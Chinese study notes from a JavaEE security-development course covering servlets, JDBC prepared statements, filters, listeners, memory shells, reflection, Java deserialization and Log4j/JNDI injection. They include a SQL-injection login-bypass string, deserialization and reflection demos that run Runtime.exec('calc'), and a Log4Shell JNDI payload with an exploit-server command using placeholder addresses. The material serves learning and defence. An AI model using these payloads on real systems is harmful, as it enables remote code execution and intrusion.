安全:SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充
安全:原生开发安全，第三方框架安全，第三方库安全等，待补充
```

## JavaEE-HTTP-Servlet&路由&周期

### 示例文件

IDEA新建项目

![image-20250830164044903](D:\cyberspace\笔记\图片\image-20250830164044903.png)

![image-20250830164144921](D:\cyberspace\笔记\图片\image-20250830164144921.png)

![image-20250830164209621](D:\cyberspace\笔记\图片\image-20250830164209621.png)

自动生成文件的目录，其中的主要文件是在src下面的main和test里面

![image-20250831095723780](D:\cyberspace\笔记\图片\image-20250831095723780.png)

不做修改尝试运行代码

![image-20250831095752400](D:\cyberspace\笔记\图片\image-20250831095752400.png)

![image-20250831095808396](D:\cyberspace\笔记\图片\image-20250831095808396.png)

点击Hello Servlet显示

![image-20250831095844314](D:\cyberspace\笔记\图片\image-20250831095844314.png)

### 创建和使用 Servlet 

#### -创建一个类继承 HttpServlet 

新建Java类，IndexServlet

![image-20250831100009789](D:\cyberspace\笔记\图片\image-20250831100009789.png)

继承HttpServlet

![image-20250831100343735](D:\cyberspace\笔记\图片\image-20250831100343735-1756605823986-1.png)

添加doGet，当客户端（如浏览器）向服务器发送一个 **HTTP GET 请求**时，这个请求最终会被路由到对应的 Servlet 上。如果该 Servlet 类中重写了 `doGet` 方法，那么服务器容器（如 Tomcat, Jetty, WildFly）就会自动调用这个 `doGet` 方法来处理这个请求

![image-20250831100601826](D:\cyberspace\笔记\图片\image-20250831100601826.png)

先输出看看是什么

![image-20250831100822034](D:\cyberspace\笔记\图片\image-20250831100822034.png)

#### -web.xml 配置 Servlet 路由 

在webapp里面的WEB-INF的web.xml文件中配置

名字自己取，class复制IndexServlet的引用

![image-20250831101133453](D:\cyberspace\笔记\图片\image-20250831101133453.png)

![image-20250831101450785](D:\cyberspace\笔记\图片\image-20250831101450785.png)

- **作用**：**告诉服务器，有一个新的服务员来了。**
- `<servlet-name>index</servlet-name>`：给他起个**花名或者工号**，叫 `index`。这个名字是为了方便内部管理，你自己喜欢叫什么都可以（比如叫 `aaa` 也行，但一般会起有意义的名字）。
- `<servlet-class>...</servlet-class>`：这是这个服务员的**身份证**，上面写着他的**全名和家庭住址**（在Java里叫`全限定类名`）。这样服务器就能根据这个地址精确地找到他这个人（这个类）。

**简单说：这一段就是登记服务员信息，给他办了个工牌，工牌上的名字叫 `index`，指向真正干活的人 `com.example.demo02.IndexServlet`。**

![image-20250831101518877](D:\cyberspace\笔记\图片\image-20250831101518877.png)

- **作用**：**告诉服务器，这个服务员应该在哪个窗口接待客人。**
- `<servlet-name>index</servlet-name>`：这里喊的是刚才那个花名叫 `index` 的服务员。**这个名字必须和上面的 `<servlet-name>` 一模一样**，否则就喊错人了。
- `<url-pattern>/index</url-pattern>`：这就是给他安排的**工位号**或者**窗口号**。现在，所有访问这个“窗口”的客人，都会由他来接待。

**简单说：这一段就是给那个叫 `index` 的服务员安排了一个工作岗位，岗位地址是 `/index`。**

当在浏览器里输入网址：`http://网站地址/项目名/index`，于是，`IndexServlet` 里的 `doGet` 或 `doPost` 方法就开始工作，为客人生成响应

![image-20250831101617253](D:\cyberspace\笔记\图片\image-20250831101617253.png)

所以这个时候运行之后访问/index就会触发IndexServlet里面的doGet然后输出-------doGet，运行之后apache会自动生成文件在目录下

![image-20250831102036481](D:\cyberspace\笔记\图片\image-20250831102036481.png)

访问index

![image-20250831102053961](D:\cyberspace\笔记\图片\image-20250831102053961.png)

![image-20250831102108777](D:\cyberspace\笔记\图片\image-20250831102108777.png)

```
System.out.println("-------doGet");
```

这个是显示到调试器里面，下面是有回显

![image-20250831102716672](D:\cyberspace\笔记\图片\image-20250831102716672.png)

运行，url后门加上name值

![image-20250831103041492](D:\cyberspace\笔记\图片\image-20250831103041492.png)

这个是Get，还有POST

![image-20250831103519763](D:\cyberspace\笔记\图片\image-20250831103519763.png)

![image-20250831103643383](D:\cyberspace\笔记\图片\image-20250831103643383.png)

还有很多其他的

![image-20250831103707208](D:\cyberspace\笔记\图片\image-20250831103707208.png)

#### -WebServlet 配置 Servlet 路由 

这个方法就不需要去web.xml文件配置了，只需要在class上面加上

```
@WebServlet("/new")
```

![image-20250831105155301](D:\cyberspace\笔记\图片\image-20250831105155301.png)

运行

![image-20250831105310842](D:\cyberspace\笔记\图片\image-20250831105310842.png)

#### -写入内置方法(init service destroy doget dopost) 

![image-20250830084704648](D:\cyberspace\笔记\图片\image-20250830084704648.png)

了解内置函数的执行顺序

![image-20250831105859113](D:\cyberspace\笔记\图片\image-20250831105859113.png)

每一个都写一个输出来看执行顺序

1. `init(ServletConfig config)`

- **调用时机**：在Servlet被**第一次创建时调用，且只调用一次**。
- **作用**：用于执行**一次性初始化**工作。比如加载配置文件、建立数据库连接池等。
- **注意**：通常我们不会直接重写这个方法，而是重写无参数的 `init()` 方法，因为 `ServletConfig` 的初始化工作父类已经做好了。

2. `service(ServletRequest req, ServletResponse res)`

- **调用时机**：**每次请求**到达时，容器**首先调用**这个方法。
- **作用**：这是最顶层的服务方法，接收通用的请求和响应对象。它的主要任务是将通用的 `ServletRequest`/`ServletResponse` **转换**为HTTP专用的 `HttpServletRequest`/`HttpServletResponse`，然后调用下一个 `service` 方法。

3. `service(HttpServletRequest req, HttpServletResponse resp)`

- **调用时机**：被上一个 `service` 方法**自动调用**。
- **作用**：这是HTTP专用的服务方法。它会检查请求的方法类型（`req.getMethod()`），如果是GET就调用 `doGet()`，如果是POST就调用 `doPost()`，等等。**这是请求分发的核心枢纽**。

4. `doGet()` / `doPost()`

- **调用时机**：被上一个 `service` 方法根据请求类型**调用**。
- **作用**：**这才是真正写业务逻辑的地方**。你平时重写的就是这两个方法。

5. `destroy()`

- **调用时机**：在Servlet被**销毁之前**调用（通常是在服务器关闭或项目卸载时），**且只调用一次**。
- **作用**：用于执行**清理工作**。比如关闭数据库连接、释放资源等。

## JavaEE-数据库-JDBC&Mybatis&库

下载jar文件之后创建lib目录存放

![image-20250831112645540](D:\cyberspace\笔记\图片\image-20250831112645540.png)

右键添加为库

### 注册数据库驱动

![image-20250831124010547](D:\cyberspace\笔记\图片\image-20250831124010547.png)

### 建立数据库连接

![image-20250831124741291](D:\cyberspace\笔记\图片\image-20250831124741291.png)

### 创建Statement执行SQL

![image-20250831125737620](D:\cyberspace\笔记\图片\image-20250831125737620.png)

在这里的sql查询语句如果是拼接的写法也很难产生sql注入，因为有预编译

### 什么是预编译？

想象一下你要去餐厅吃饭：

- **普通 Statement**：就像每次点菜都重新写一份完整的菜单："我要一份**鱼香肉丝**"。
- **预编译 PreparedStatement**：餐厅有个预制好的菜单模板："我要一份**______**"，你只需要在空白处填上菜名。

在JDBC中，`PreparedStatement` 就是一个带有**占位符** `?` 的SQL模板。

**代码对比**

#### 1. 不使用预编译（Statement - 有风险）

```
String username = request.getParameter("username"); // 用户输入：'admin' OR '1'='1'
String password = request.getParameter("password");

// 直接拼接SQL字符串 - 危险！
String sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(sql);
```

**最终生成的SQL：**

```
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '任意密码'
```

由于 `OR '1'='1'` 永远为真，黑客就能绕过登录

#### 2. 使用预编译（PreparedStatement - 安全）

```
String username = request.getParameter("username"); // 即使用户输入：'admin' OR '1'='1'
String password = request.getParameter("password");

// 使用带占位符的SQL模板
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(sql);

// 为占位符设置值
pstmt.setString(1, username); // 第一个问号
pstmt.setString(2, password); // 第二个问号

ResultSet rs = pstmt.executeQuery();
```

**无论用户输入什么，最终执行的SQL都是：**

```
SELECT * FROM users WHERE username = '\'admin\' OR \'1\'=\'1\'' AND password = '任意密码'
```

注意：用户的恶意输入被当成了一个**完整的字符串值**，而不是SQL代码的一部分

1. **编译与执行分离**：
   - `PreparedStatement` 先将SQL模板（`SELECT * FROM users WHERE username = ? AND password = ?`）发送给数据库进行编译。
   - 数据库知道这是一个查询，其中有两个参数需要后续传入。
2. **数据作为字面值**：
   - 当你调用 `pstmt.setString(1, username)` 时，即使用户输入了 `' OR '1'='1`，数据库也会把它当作一个**完整的字符串**。
   - 它不会再次编译SQL，只是简单地将这个字符串值"填入"预先编译好的查询模板中。
3. **自动转义**：
   - PreparedStatement 会自动处理特殊字符（如单引号`'`），会在它们前面加上转义符`\`，确保它们被当作数据的一部分，而不是SQL语法。

<br/>

# 第33天：安全开发-JavaEE应用&SQL预编译&Filter过滤器&Listener监听器&访问控制

```
#JavaEE-预编译-SQL 
预编译 SQL 语句并执行,预防 SQL 注入问题 
String safesql="select * from news where id=?"; 
PreparedStatement 
preparedStatement=connection.prepareStatement(); 
preparedStatement.setString(1,s); 
ResultSet resultSet=preparedStatement.executeQuery(); 
 
#JavaEE-过滤器-Filter 
Filter 被称为过滤器，过滤器实际上就是对 Web 资源进行拦截，做一些处理后再交给下一个过滤器或 Servlet 处理，通常都是用来拦截 request 进行处理的，也可以对返回的 response 进行拦截处理。开发人员利用 filter 技术，可以实现对所有 Web 资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。 
1、创建过滤器 
2、过滤器内置方法 
init doFilter destroy 
3、过滤器触发流程 
@WebFilter("/xss") 
<filter> 
 <filter-name>xssFilter</filter-name> 
 <filter-class>com.example.filter.xssFilter</filter-class> 
</filter> 
<filter-mapping> 
 <filter-name>xssFilter</filter-name> 
 <url-pattern>/xss</url-pattern> 
</filter-mapping> 
4、过滤器安全场景 
Payload 检测，权限访问控制，红队内存马植入，蓝队清理内存马等 
内存马参考：https://mp.weixin.qq.com/s/hev4G1FivLtqKjt0VhHKmw 
 
#JavaEE-监听器-Listen 
参考：https://blog.csdn.net/qq_52797170/article/details/124023760 -监听 ServletContext、HttpSession、ServletRequest 等域对象创建和销毁事件 
-监听域对象的属性发生修改的事件 
-监听在事件发生前、发生后做一些必要的处理 
1、创建监听器 
2、监听器内置方法 
3、监听器触发流程 
@WebListener 
<listener>
......
</listener>
4、监听器安全场景代码审计中分析执行逻辑触发操作，后门内存马植入等
```

![image-20250901091150644](D:\cyberspace\笔记\图片\image-20250901091150644.png)

![image-20250901091201998](D:\cyberspace\笔记\图片\image-20250901091201998.png)

![image-20250901091220089](D:\cyberspace\笔记\图片\image-20250901091220089.png)

## JavaEE-预编译-SQL

### sql的拼接写法

![image-20250901101833031](D:\cyberspace\笔记\图片\image-20250901101833031.png)

![image-20250901101846702](D:\cyberspace\笔记\图片\image-20250901101846702.png)

![image-20250901102208265](D:\cyberspace\笔记\图片\image-20250901102208265.png)

### 预编译安全写法

![image-20250901101920734](D:\cyberspace\笔记\图片\image-20250901101920734.png)

![image-20250901102014919](D:\cyberspace\笔记\图片\image-20250901102014919.png)

这里的原理上一篇结尾写了一点

## JavaEE-过滤器-Filter

### Xss过滤

快捷键：alt+insert，显示

![image-20250901105736327](D:\cyberspace\笔记\图片\image-20250901105736327.png)

新建目录Filter，文件XssFilter.java

![image-20250901111903809](D:\cyberspace\笔记\图片\image-20250901111903809.png)

注意路由是@WebFilter，接口Filter，三个方法：初始化、过滤、销毁，运行

![image-20250901112010092](D:\cyberspace\笔记\图片\image-20250901112010092.png)

还没有访问test的时候就已经初始化了

![image-20250901112028379](D:\cyberspace\笔记\图片\image-20250901112028379.png)

doFilter是在访问了路由之后才会用的方法

![image-20250901112335995](D:\cyberspace\笔记\图片\image-20250901112335995.png)

![image-20250901112341097](D:\cyberspace\笔记\图片\image-20250901112341097.png)

加上放行请求和回复

![image-20250901112429087](D:\cyberspace\笔记\图片\image-20250901112429087.png)

![image-20250901112505963](D:\cyberspace\笔记\图片\image-20250901112505963.png)

xss拦截：

![image-20250901113409563](D:\cyberspace\笔记\图片\image-20250901113409563.png)

当输入xss语句的时候

![image-20250901113656248](D:\cyberspace\笔记\图片\image-20250901113656248.png)

![image-20250901113704776](D:\cyberspace\笔记\图片\image-20250901113704776.png)

被过滤了，访问一次就过滤一次

![image-20250901114549960](D:\cyberspace\笔记\图片\image-20250901114549960.png)

如果是正常的语句就可以放心到TestServlet里面然后执行

### 后台登录Cookie过滤

AdminServlet.java：

![image-20250901152043537](D:\cyberspace\笔记\图片\image-20250901152043537.png)

AdminFilter.java：

![image-20250901152104048](D:\cyberspace\笔记\图片\image-20250901152104048.png)

也是有初始化、过滤加销毁，用Cookie验证

运行之后访问admin会显示Cookie值和非法

![image-20250901152423382](D:\cyberspace\笔记\图片\image-20250901152423382.png)

![image-20250901152433197](D:\cyberspace\笔记\图片\image-20250901152433197.png)

去浏览器加上Cookie

![image-20250901152508441](D:\cyberspace\笔记\图片\image-20250901152508441.png)

再次访问

![image-20250901152528875](D:\cyberspace\笔记\图片\image-20250901152528875.png)

进入了

## 内存马

### 1. 常规后门

想象一下，黑客攻入了一台服务器（比如一个网站服务器）。

- **是什么**：他会在服务器的硬盘上**上传一个后门文件**，比如一个特殊的 `shell.php` 或 `hack.exe`。
- **如何工作**：这个文件本身就是一个完整的、独立的恶意程序。攻击者通过访问这个文件的网址或执行它，就能获得服务器的控制权。
- **特点**：
  - **有文件实体**：在硬盘上真实存在，看得见摸得着。
  - **持久化**：服务器不重启，它就一直存在。
  - **易被发现**：安全软件（杀毒软件、Webshell扫描工具）可以通过扫描硬盘文件，很容易地发现并删除它。

### 2. 内存马

黑客攻入服务器后，换了一种更高级的思路。

- **是什么**：他**不上传任何文件**，而是利用服务器上正在运行的某个合法程序（比如 Tomcat、Weblogic、Spring 等Java应用）的**漏洞或功能**，将恶意代码直接**注入到该程序的内存中**。
- **如何工作**：这段恶意代码会伪装成服务器的一个**合法部件**，比如一个Filter（过滤器）、一个Servlet、一个Controller等。当外部有特定请求发来时，这个“内鬼”部件就会激活，执行攻击者的命令。
- **特点**：
  - **无文件实体**：它只存在于服务器的**内存（RAM）** 里，硬盘上找不到任何对应的恶意文件。
  - **隐蔽性极高**：传统的文件扫描手段完全无效，因为根本就没文件可扫。
  - **非持久化**：一旦服务器重启，内存中的数据全部清空，这个内存马也就“死”了。但高手攻击者会想办法让它在重启后能自动重新注入。
  - **检测困难**：需要分析内存快照或监控进程的异常行为才能发现，门槛很高。

## JavaEE-监听器-Listen

CSession文件，用来创建Session

![image-20250901160658621](D:\cyberspace\笔记\图片\image-20250901160658621.png)

DSession文件，用来销毁Session：

![image-20250901160718066](D:\cyberspace\笔记\图片\image-20250901160718066.png)

监听器：，注意@WebListener不需要路由

![image-20250901160733595](D:\cyberspace\笔记\图片\image-20250901160733595.png)

运行

![image-20250901160820137](D:\cyberspace\笔记\图片\image-20250901160820137.png)

还没有访问cs和ds监听器就开启了，访问cs

![image-20250901161238814](D:\cyberspace\笔记\图片\image-20250901161238814.png)

创建了Session，访问ds

![image-20250901161303673](D:\cyberspace\笔记\图片\image-20250901161303673.png)

也就是创建和销毁都监听到了

如果一直访问cs的话只会一直创建Session但是监听只有一次

![image-20250901161844894](D:\cyberspace\笔记\图片\image-20250901161844894.png)

<br/>

# 第34天：安全开发-JavaEE应用&反射机制&攻击链&类对象&成员变量方法&构造方法

```
1、什么是 Java 反射 
参考：https://xz.aliyun.com/t/9117 
Java 提供了一套反射 API，该 API 由 Class 类与 java.lang.reflect 类库组成。 该类库包含了 Field、Method、Constructor 等类。 
对成员变量，成员方法和构造方法的信息进行的编程操作可以理解为反射机制。 
 
2、为什么要用到反射 
参考：https://xz.aliyun.com/t/9117 
其实从官方定义中就能找到其存在的价值，在运行时获得程序或程序集中每一个类型的成员和成员的信息，从而动态的创建、修改、调用、获取其属性，而不需要事先知道运行的对象是谁。划重点：在运行时而不是编译时。（不改变原有代码逻辑，自行运行的时候动态创建和编译即可） 
 
3、反射机制应用 
开发应用场景： 
Spring 框架的 IOC 基于反射创建对象和设置依赖属性。 
SpringMVC 的请求调用对应方法，也是通过反射。 
JDBC 的 Class#forName(String className)方法，也是使用反射。 
 
安全应用场景： 
构造利用链，触发命令执行 
反序列化中的利用链构造 
动态获取或执行任意类中的属性或方法 
动态代理的底层原理是反射技术 
rmi 反序列化也涉及到反射操作 
 
#Java-反射-Class 对象类获取 
//1、根据类名：类名.class 
Class userClass = User.class; 
//2、根据对象：对象.getClass() 
User user = new User(); 
Class aClass = user.getClass(); 
//3、根据全限定类名：Class.forName("全路径类名") 
Class aClass1 = Class.forName("com.example.reflectdemo.User"); 
//4、通过类加载器获得 Class 对象：
//ClassLoader.getSystemClassLoader().loadClass("全路径类名"); 
ClassLoader clsload=ClassLoader.getSystemClassLoader(); 
Class aClass2 = 
clsload.loadClass("com.example.reflectdemo.User"); 
```

![image-20250902092151430](D:\cyberspace\笔记\图片\image-20250902092151430.png)

## Java-反射-Class 对象类获取

四种方法都可以获取

![image-20250902095329226](D:\cyberspace\笔记\图片\image-20250902095329226.png)

## Java-反射-Field 成员变量类获取

![image-20250902092203835](D:\cyberspace\笔记\图片\image-20250902092203835.png)

先要获取Class对象再去获取成员变量

### Field[] getfields():返回所有公共成员变量对象的数组

![image-20250902095856075](D:\cyberspace\笔记\图片\image-20250902095856075.png)

获取到了public的name和age

### Field[] getDeclaredFields():返回所有成员变量对象的数组

![image-20250902100147239](D:\cyberspace\笔记\图片\image-20250902100147239.png)

### Field getField(String name):返回单个公共成员变量对象

![image-20250902100434712](D:\cyberspace\笔记\图片\image-20250902100434712.png)

public的可以获取，private和protected不行

![image-20250902100521383](D:\cyberspace\笔记\图片\image-20250902100521383.png)

### Field getDeclaredField(String name):返回单个成员变量对象

![image-20250902100611469](D:\cyberspace\笔记\图片\image-20250902100611469.png)

这个所有的都可以

### 获取公共变量的值

![image-20250902101140751](D:\cyberspace\笔记\图片\image-20250902101140751.png)

### 设置值

![image-20250902101626552](D:\cyberspace\笔记\图片\image-20250902101626552.png)

## Java-反射-Method 成员方法类获取

![image-20250902092232342](D:\cyberspace\笔记\图片\image-20250902092232342.png)

### Method[]getMethods():返回所有公共成员方法对象的数组，包括继承的

![image-20250902103923198](D:\cyberspace\笔记\图片\image-20250902103923198.png)

包括内置的

### Method[]getDeclaredMethods():返回所有成员方法对象的数组，不包括继承的

![image-20250902104042661](D:\cyberspace\笔记\图片\image-20250902104042661.png)

### Method getMethod(String name,Class<?>.. parameterTypes):返回单个公共成员方法对象

![image-20250902104408674](D:\cyberspace\笔记\图片\image-20250902104408674.png)

私有的不行

![image-20250902105318756](D:\cyberspace\笔记\图片\image-20250902105318756.png)

### Method getDeclaredMethod(String name, Class<?>.. parameterTypes):返回单个成员方法对象

![image-20250902105339095](D:\cyberspace\笔记\图片\image-20250902105339095.png)

### 操作

public直接操作

![image-20250902111928623](D:\cyberspace\笔记\图片\image-20250902111928623.png)

私有关闭Java访问检查

![image-20250902112205342](D:\cyberspace\笔记\图片\image-20250902112205342.png)

## Java-反射-Constructor 构造方法类获取

![image-20250902092222577](D:\cyberspace\笔记\图片\image-20250902092222577.png)

### Constructor<?>[]getConstructors():返回所有公共构造方法对象的数组

![image-20250902102233278](D:\cyberspace\笔记\图片\image-20250902102233278.png)

### Constructor<?>[]getDeclaredConstructors():返回所有构造方法对象的数组

![image-20250902102314026](D:\cyberspace\笔记\图片\image-20250902102314026.png)







### Constructor`<T>`getConstructor(Class<?>.. parameterTypes):返回单个公共构造方法对象

![image-20250902102438384](D:\cyberspace\笔记\图片\image-20250902102438384.png)

获取的是一个String name的构造方法

![image-20250902102503514](D:\cyberspace\笔记\图片\image-20250902102503514.png)

不能获取私有

![image-20250902102601673](D:\cyberspace\笔记\图片\image-20250902102601673.png)

### Constructor`<T>`getDeclaredConstructor(Class<?>.. parameterTypes):返回单个构造方法对象

![image-20250902102905813](D:\cyberspace\笔记\图片\image-20250902102905813.png)

获取所有的

### 操作

![image-20250902103358089](D:\cyberspace\笔记\图片\image-20250902103358089.png)

## Java-反射-不安全命令执行&反序列化链 

### 原生对象调用

![](D:\cyberspace\笔记\图片\image-20250902150509084.png)

运行调用计算器出来

### 第三方调用

通过反射获取 Runtime 并调用 exec("calc.exe")

![image-20250902171626714](D:\cyberspace\笔记\图片\image-20250902171626714.png)

先看成员方法

exec有：

![image-20250902172417776](D:\cyberspace\笔记\图片\image-20250902172417776.png)

getRuntime是：

![image-20250902172445356](D:\cyberspace\笔记\图片\image-20250902172445356.png)

![image-20250902172236675](D:\cyberspace\笔记\图片\image-20250902172236675.png)

运行后启动计算器

就是学会怎么调用其他jar包里面的方法

<br/>

# 第35天：安全开发-JavaEE应用&原生反序列化&重写方法&链条分析&触发类&类加载

```
1、序列化与反序列化 
序列化：将内存中的对象压缩成字节流 
反序列化：将字节流转化成内存中的对象 
 
2、为什么有序列化技术 
序列化与反序列化的设计就是用来传输数据的。 
当两个进程进行通信的时候，可以通过序列化反序列化来进行传输。 
能够实现数据的持久化，通过序列化可以把数据永久的保存在硬盘上，也可以理解为通过序列化将数据保存在文件中。 
应用场景 
(1) 想把内存中的对象保存到一个文件中或者是数据库当中。 
(2) 用套接字在网络上传输对象。 
(3) 通过 RMI 传输对象的时候。 
 
3、几种创建的序列化和反序列化协议 
• JAVA 内置的 writeObject()/readObject() 
• JAVA 内置的 XMLDecoder()/XMLEncoder 
• XStream 
• SnakeYaml 
• FastJson 
• Jackson 
 
4、为什么会出现反序列化安全问题 
内置原生写法分析 
• 重写 readObject 方法 
• 输出调用 toString 方法 
 
5、反序列化利用链 
(1) 入口类的 readObject 直接调用危险方法 
(2) 入口参数中包含可控类，该类有危险方法，readObject 时调用 
(3) 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用 (4) 构造函数/静态代码块等类加载时隐式执行 
 
#Java-原生使用-序列化&反序列化 
//进行序列化对象并写入文件 ser.txt 
public static void serializeTest(Object obj) throws IOException {  ObjectOutputStream oos = new ObjectOutputStream(new 
FileOutputStream("ser.txt")); 
 oos.writeObject(obj); 
```

![image-20250903113042259](D:\cyberspace\笔记\图片\image-20250903113042259.png)

```
什么是学列化和反学列化
	为什么会产生安全问题?
	可能的形式
	JAVA原生反序列化漏洞成因
Java序列化和反序列化基础
	编写一个可以序列化的类
	如何序列化类
	如何反序列化类
	serialVersionUlD
Java反射
	反射的作用
	获取字节码Class对象的三种方式
	Class对象
		Field
		Constructof
		Method
		获取类名
	案例
java代理
	静态代理
	动态代理
Java类的动态加载
	javac原理
	类加戟过程
	动态类加载方法
		Class.forname
		ClassLoader
	漏洞利用相关类
		URLClassLoader
		defineclass
		unsafe
Map集合
	Map集合类型
	Map接口
	Map使用
```

## Java-原生使用-序列化&反序列化

### ✅ 什么是序列化（Serialization）

- **定义**：把 **对象（Object）** 转换成 **字节流（Byte Stream）** 的过程。
- **目的**：对象在内存里是复杂的数据结构，不能直接保存到文件或通过网络传输。序列化就是“打包”对象，让它变成一串可以保存/传输的字节。
  - **比喻**：就像把一份快递（对象）装进纸箱（字节流），这样才能寄出去（保存/传输）。

UserDemo

![image-20250903120611882](D:\cyberspace\笔记\图片\image-20250903120611882.png)

SerializableDemo

![image-20250903120626170](D:\cyberspace\笔记\图片\image-20250903120626170.png)

其中

```
ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream("ser.txt"));
oos.writeObject(obj);
```

就是把 `UserDemo` 对象序列化，写进文件 `ser.txt`

运行之后产生文件ser.txt

![image-20250903120716253](D:\cyberspace\笔记\图片\image-20250903120716253.png)

![image-20250903120724415](D:\cyberspace\笔记\图片\image-20250903120724415.png)

ser.txt就是序列化的字节流数据

### ✅ 什么是反序列化（Deserialization）

- **定义**：把 **字节流（Byte Stream）** 重新转换成 **对象（Object）** 的过程。
- **目的**：读取已经保存到文件或通过网络接收到的对象数据，并恢复成原来的 Java 对象。
- **比喻**：就像收到快递（字节流），把纸箱拆开，又能拿到原来的物品（对象）。

DeserialiableDemo

![image-20250903121944745](D:\cyberspace\笔记\图片\image-20250903121944745.png)

## Java-安全问题-重写方法&触发方法

在UserDemo里面重写readObject方法

![image-20250903143722442](D:\cyberspace\笔记\图片\image-20250903143722442-1756881442774-1.png)

这个时候运行反序列会执行命令启动计算器

### 📌 正常情况下

1. **序列化**
   - `ObjectOutputStream.writeObject(obj)`
   - 把对象的属性（name, age, gender 等）写入文件 `ser.txt`。
2. **反序列化**
   - `ObjectInputStream.readObject()`
   - Java 内部会按照类的结构去恢复对象。
   - 如果类里没定义 `readObject`，就调用默认的机制（按属性一个个读回来）。

### 📌 这种情况

1. **序列化 UserDemo**

   - 一切正常，`ser.txt` 文件里保存了对象的状态。

2. **反序列化 UserDemo**

   - `ObjectInputStream.readObject()` 内部会去找类里的 `readObject(ObjectInputStream ois)` 方法。

   - **你自己写了一个重写的 `readObject`**，而且里面有恶意代码：

     ```
     Runtime.getRuntime().exec("calc");
     ```

   - 于是，当反序列化 `UserDemo` 时，并不会仅仅“恢复数据”，而是执行了你写的 `readObject`，从而运行系统命令（比如弹计算器）。

### 📌 本质原因

- Java 反序列化机制 **信任对象自身的实现**。
- 如果攻击者能传入一个恶意类（或者用现有类的链子触发恶意代码），反序列化时就会执行其中的恶意逻辑。
- 这就是 **Java 反序列化漏洞** 的原理。

![image-20250903144835851](D:\cyberspace\笔记\图片\image-20250903144835851.png)

加一个ois.defaultReadObject();的区别就是拿不拿原始数据

没加的执行之后是

![image-20250903144920807](D:\cyberspace\笔记\图片\image-20250903144920807.png)

加了的执行之后是

![image-20250903145017698](D:\cyberspace\笔记\图片\image-20250903145017698.png)

断点调试

![image-20250903145509412](D:\cyberspace\笔记\图片\image-20250903145509412.png)

在要进入ois.readObject();时

![image-20250903145708302](D:\cyberspace\笔记\图片\image-20250903145708302.png)

到了UserDemo里面重写的readObject方法中

![image-20250903145743683](D:\cyberspace\笔记\图片\image-20250903145743683.png)

![image-20250903145750803](D:\cyberspace\笔记\图片\image-20250903145750803.png)

执行了命令

### toString

UserDemo的toString里面加上命令执行语句

![image-20250903150550190](D:\cyberspace\笔记\图片\image-20250903150550190.png)

然后反序列化的时候会有输出，输出调用的是UserDemo的toString方法

![image-20250903150630306](D:\cyberspace\笔记\图片\image-20250903150630306.png)

所以命令会被执行，如果反序列化没有输出那么就不会执行

## Java-安全问题-可控其他类重写方法 

![image-20250903153324038](D:\cyberspace\笔记\图片\image-20250903153324038.png)

```
漏洞原理：
1. 反序列化 HashMap 对象时，会调用 HashMap.readObject() 恢复数据。
2. readObject 内部会调用 putVal() 插入每个键值对。
3. putVal() 会计算键的 hashCode()，这里键是 URL。
4. URL.hashCode() 会触发 DNS 查询（副作用）。
5. 如果这里用其他类或方法触发系统命令，就可能导致 RCE 漏洞。
因此，只要反序列化不可信对象，就可能被利用。
```

上面的漏洞的前提是 `readObject`

**readObject 是反序列化漏洞的主要触发点**，因为它允许类在被反序列化时执行任意代码

<br/>

# 第36天：安全开发-JavaEE应用&第三方组件&Log4j日志&FastJson序列化&JNDI注入

```
Jar 仓库： 
https://mvnrepository.com/ 
 
Maven 配置： 
https://www.jb51.net/article/259780.htm
 
JNDI 注入：(见图) 
Java Naming and Directory Interface (Java 命名和目录接口 )，JNDI 提
供统一的客户端 API，通过不同的服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录服务，使得 JAVA 应用程可以通过 JNDI 实现和这些命名服务和目录服务之间的交互。 
 
#Java-三方组件-Log4J&JNDI 
Log4J： 
Apache 的一个开源项目，通过使用 Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI 组件，甚至是套接口服务器、NT 的事件记录器、UNIX Syslog 守护进
程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。 
 
Log4j-组件安全复现 
1、Maven 引用 Log4j 
2、接受用户输入值 
3、Log4j 处理错误输入 
4、利用 jndi-ldap 执行 
Test: 
String code="test"; 
String code="${java:os}"; 
logger.error("{}",code); 
String exp="${jndi:ldap://xx.xx.xx.xx:xx/xxx}"; 
服务器： 
java -jar JNDI-Injection-Exploit.jar -C "calc" -A xx.xx.xx.xx 
 
#Java-三方组件-FastJson&反射 
FastJson： 
在前后端数据传输交互中,经常会遇到字符串(String)与 json,XML 等格式相互转换与解析，其中 json 以跨语言，跨前后端的优点在开发中被频繁使用，基本上是标准的数据交换格式。它的接口简单易用，已经被广泛使用在缓存序列化，协议交互，Web 输出等各种应用场景中。FastJson 是阿里巴巴的的开源库，用于对 JSON 格式的数据进行解析和
```

![image-20250904103308094](D:\cyberspace\笔记\图片\image-20250904103308094.png)

## Java-三方组件-Log4J&JNDI

下载配置Maven：https://www.jb51.net/article/259780.htm

### 1、Maven 引用 Log4j 











### 2、接受用户输入值 













### 3、Log4j 处理错误输入 











### 4、利用 jndi-ldap 执行 











## Java-三方组件-FastJson&反射 
